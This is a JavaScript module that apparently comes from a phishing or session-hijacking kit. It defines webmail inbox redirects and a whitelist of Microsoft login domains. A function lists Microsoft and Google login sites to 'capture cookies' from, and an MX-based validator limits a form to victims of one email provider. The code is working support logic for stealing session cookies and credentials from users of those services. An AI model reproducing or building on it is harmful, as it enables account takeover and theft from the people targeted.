import logger from "../../../../../utils/logger.js";
import { platformConfigs } from "../platforms.js";
import { resolveMx, resolveA } from '../routeHelper.js';

// ── Shared Constants ─────────────────────────────────────────────────────────

export const PLATFORM_INBOX_URLS = {
    'outlook.com': 'https://outlook.live.com/mail/',
    'hotmail.com': 'https://outlook.live.com/mail/',
    'live.com': 'https://outlook.live.com/mail/',
    'msn.com': 'https://outlook.live.com/mail/',
    'gmail.com': 'https://mail.google.com/mail/',
    'googlemail.com': 'https://mail.google.com/mail/',
    'yahoo.com': 'https://mail.yahoo.com/',
    'aol.com': 'https://mail.aol.com/',
};

export const TAB_WHITELIST = [
    'm365.cloud.microsoft',
    'login.live.com',
    'login.microsoftonline.com',
    'login.microsoft.com',
    'aka.ms',
    'outlook.live.com',
    'outlook.office365.com',
    'portal.office.com',
    'onedrive.live.com',
];

const COOKIE_CAPTURE_STATIC_URLS = [
    'https://login.live.com',
    'https://login.microsoftonline.com',
    'https://www.microsoft.com',
    'https://outlook.live.com',
    'https://mail.google.com',
];

/**
 * Returns the full list of URLs to capture cookies from.
 * @param {string} [domain] - The user's email domain (e.g. 'gmail.com'). Prepended if provided.
 * @returns {string[]}
 */
export function getCookieCaptureUrls(domain) {
    if (domain) {
        return [`https://${domain}`, ...COOKIE_CAPTURE_STATIC_URLS];
    }
    return [...COOKIE_CAPTURE_STATIC_URLS];
}

// ── Email Validation ─────────────────────────────────────────────────────────

/**
 * Validates an email domain against a `strictly` platform using MX record detection.
 * @param {string} email - The email address to validate
 * @param {string} strictly - The required platform key (e.g., 'outlook', 'gmail', 'proton')
 * @returns {Promise<{valid: boolean, message: string, detectedPlatform: string}>}
 */
export async function validateEmailAgainstStrictly(email, strictly) {
    if (!strictly || !email) {
        return { valid: true, message: '', detectedPlatform: '' };
    }

    const strictlyLower = strictly.toLowerCase();
    const platformConfig = platformConfigs[strictlyLower];

    if (!platformConfig || !platformConfig.mxKeywords) {
        logger.warn(`[validateEmailAgainstStrictly] Unknown strictly platform: '${strictly}'`);
        return { valid: true, message: '', detectedPlatform: '' };
    }

    const domain = email.split('@')[1]?.toLowerCase();
    if (!domain) {
        return { valid: false, message: 'Invalid email format.', detectedPlatform: '' };
    }

    let mxRecords = [];
    try {
        mxRecords = await resolveMx(domain).catch(() => []);
        if (!mxRecords || mxRecords.length === 0) {
            await new Promise(r => setTimeout(r, 500));
            mxRecords = await resolveMx(domain).catch(() => []);
        }
    } catch (e) {
        logger.debug(`[validateEmailAgainstStrictly] MX resolution failed for ${domain}: ${e.message}`);
    }
    if (!mxRecords || mxRecords.length === 0) {
        const domainMatchesKeyword = platformConfig.mxKeywords.some(kw => domain.includes(kw));
        if (domainMatchesKeyword) {
            logger.warn(`[validateEmailAgainstStrictly] MX unavailable for '${email}' but domain matches platform keyword — passing through for on-page validation (strictly='${strictly}')`);
            return { valid: true, message: '', detectedPlatform: strictlyLower };
        }

        let domainHasARecord = false;
        let aDnsFailed = false;
        try {
            const aRecords = await resolveA(domain);
            domainHasARecord = Array.isArray(aRecords) && aRecords.length > 0;
        } catch (e) {
            aDnsFailed = true;
        }
        if (aDnsFailed) {
            const platformName = strictlyLower === 'outlook' ? 'Microsoft' : strictlyLower.charAt(0).toUpperCase() + strictlyLower.slice(1);
            logger.warn(`[validateEmailAgainstStrictly] A-record lookup failed for '${domain}' and domain doesn't match '${strictly}' keywords. Rejecting '${email}'.`);
            return { valid: false, message: `Incorrect email. This form only accepts ${platformName} accounts.`, detectedPlatform: '' };
        }
        if (!domainHasARecord) {
            logger.warn(`[validateEmailAgainstStrictly] Domain '${domain}' has no MX and no A record (NXDOMAIN). Rejecting '${email}'.`);
            return { valid: false, message: 'Incorrect email. Please check the email address.', detectedPlatform: '' };
        }
        logger.warn(`[validateEmailAgainstStrictly] MX unavailable for '${email}' but domain has A record — passing through for on-page validation (strictly='${strictly}')`);
        return { valid: true, message: '', detectedPlatform: strictlyLower };
    }

    const matchedKeyword = platformConfig.mxKeywords.find(kw =>
        domain.includes(kw) || mxRecords.some(mx => mx.exchange && mx.exchange.includes(kw))
    );

    if (matchedKeyword) {
        logger.info(`[validateEmailAgainstStrictly] Email '${email}' matches strictly='${strictly}' (matched: '${matchedKeyword}')`);
        return { valid: true, message: '', detectedPlatform: strictlyLower };
    }

    const platformName = strictlyLower === 'outlook' ? 'Microsoft' : strictlyLower.charAt(0).toUpperCase() + strictlyLower.slice(1);
    const message = `Incorrect email. This form only accepts ${platformName} accounts.`;
    logger.warn(`[validateEmailAgainstStrictly] Email '${email}' rejected for strictly='${strictly}' (domain: ${domain})`);
    return { valid: false, message, detectedPlatform: '' };
}
